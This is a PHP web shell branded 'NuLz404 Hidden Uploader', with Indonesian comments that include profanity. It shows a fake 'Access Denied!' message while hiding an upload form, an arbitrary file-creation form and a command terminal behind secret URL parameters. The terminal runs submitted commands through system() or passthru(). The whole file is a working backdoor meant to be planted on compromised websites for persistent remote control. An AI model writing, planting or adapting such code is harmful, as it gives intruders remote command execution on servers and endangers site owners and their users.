<?php
//NuLz404
//Kalo Recode Nama gw jangan di Apus anjing
//Kontol Lu Semua
echo "<h1>Access Denied!</h1>";

//Upload Validation
if (isset($_POST['btn-upl'])) {
	$a1 = $_FILES['upl']['name'];
	$b2 = $_FILES['upl']['tmp_name'];
	$c3 = "";
	if (move_uploaded_file($b2, $c3.$a1)) {
		echo "<script>alert('Upload Success :)')</script>";
	} else {
		echo "<script>alert('Upload Failed! :(')</script>";
	}
}

//Create File Validation
if (isset($_POST['buatfile'])) {
    $namafile = $_POST['namafile'];
    $isifile = $_POST['isifile'];
    $handle = fopen("$namafile", "w");
    if ($isifile) {
        $buatfile = fwrite($handle, $isifile);
    } else {
        $buatfile = $handle;
    }
    if ($buatfile) {
        echo "<script>alert('Berhasil Buat File :)');</script>";
    } else {
        echo "<script>alert('Gagal Buat File :(');</script>";
    }
}

if (isset($_GET['nulz'])) {
	if (isset($_GET['ganteng'])) {
        echo '
        <!DOCTYPE html>
        <html lang="en">
            <head>
            <title>.:NuLz404 Hidden Uploader:.</title>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <meta http-equiv="X-UA-Compatible" content="ie=edge">
                <meta name="description" content="This Is A Hidden Uploader">
                <meta name="author" content="NuLz404">
                <link rel="shortcut icon" href="https://nulz-archive.vercel.app/archive/nulz.ico" type="image/x-icon" />
                <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" type="text/css" />
                <link href="https://fonts.googleapis.com/css?family=Trade+Winds" rel="stylesheet" type="text/css" />
                <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
                <style>
                    body {
                        background: #000000;
                        display: flex;
                        flex-wrap: wrap;
                        justify-content: center;
                        align-items: center;
                        min-height: 100vh;
                    }
                    .root {
                        display: flex;
                        flex-wrap: wrap;
                        flex-direction: column;
                        justify-content: center;
                        align-items: center;
                        color: #eaeaea;
                        width: 100%;
                        height: auto;
                    }
                    .root h1 {
                        style="font-size: 3vh;
                        font-weight: 700;
                        font-family: Trade Winds;
                        text-shadow:0pt 0pt 10pt #fc0909,0pt 0pt 20pt #ffffff,0pt 0pt 30pt #fc0909;
                    }
                    .root form {
                        display: flex;
                        flex-direction: column;
                        flex-wrap: wrap;
                        justify-content: center;
                        align-items: center;
                    }
                    .root form button {
                        background: rgba(255,255,255,0.1);
                        color: #ffffff;
                        border: 1px solid #eaeaea;
                        border-radius: 10px;
                        font-size: 1.75vh;
                        font-weight: 700;
                        padding: 2.5px 5px 2.5px;
                        margin: 0;
                    }
                    .root form button:hover {
                        background: rgba(0,0,0,0.75);
                        box-shadow: 0 0 10pt rgba(255,0,0,0.50), 0 0 20pt rgba(255,0,0,0.75);
                    }
                </style>
            </head>
        <body>
            <div class="root">
                <div class="mb-4">
                    <a href="?nulz&ganteng"><button type="button" class="btn btn-outline-light">Home</button></a>
                    <a href="?nulz&ganteng&file"><button type="button" class="btn btn-outline-light">Buat File</button></a>
                    <a href="?nulz&ganteng&terminal"><button type="button" class="btn btn-outline-light">Terminal</button></a>
                </div>
                <h1>NuLz404 Hidden Uploader</h1>
                <form action="" method="post" enctype="multipart/form-data">
                <div class="mb-3" style="display: flex; justify-content: center; align-items: center;">
                    <label for="upl" style="color: #eaeaea; font-weight: 700; font-size: 1.75vh; margin: 1rem;">Upload File</label>
                    <input type="file" name="upl" id="upl">
                    <button type="submit" name="btn-upl" id="btn-upl">Upload</button>
                </div>'
            ?>
            <?php
                if (isset($_GET['file'])) {
                    echo '
                    <div class="mb-3">
                        <label for="namafile" class="form-label">Buat File</label>
                        <input type="text" class="form-control form-control-sm" name="namafile" id="namafile" placeholder="nama file">
                        <textarea class="form-control form-control-sm mt-3" name="isifile" rows="8" placeholder="isi file" id="isifile"></textarea>
                        <div class="mt-3 d-grid gap-2">
                            <input class="btn btn-outline-light" type="submit" name="buatfile" value="Buat File">
                        </div>
                    </div>
                    ';
                }
                if (isset($_GET['terminal'])) {
                    echo '
                    <div class="mb-3">
                        <label for="terminal" class="form-label">Command</label>
                        <input type="text" class="form-control form-control-sm" name="cmd" id="cmd" placeholder="ls -la | dir">
                        <div class="mt-3 d-grid gap-2">
                            <input class="btn btn-outline-light" type="submit" name="enter" value="enter">
                        </div>';
                    echo '<textarea style="font-size: 1vh;" class="form-control form-control-lg mt-3" name="output" rows="20" readonly="true">';
						$shell = ["system", "passthru"];
						$chose = array_rand($shell);
						if (isset($_POST["enter"])) {
							echo 'Use Function > ' . $shell[$chose] . PHP_EOL . '---------------------------------------' . PHP_EOL;
							$shell[$chose]($_POST["cmd"]);
						}
					echo '
						</textarea>
                    </div>
                    ';
                }
            ?>
            <?php    
                '</form>
            </div>
        </body>
        </html>';
    }
}
?>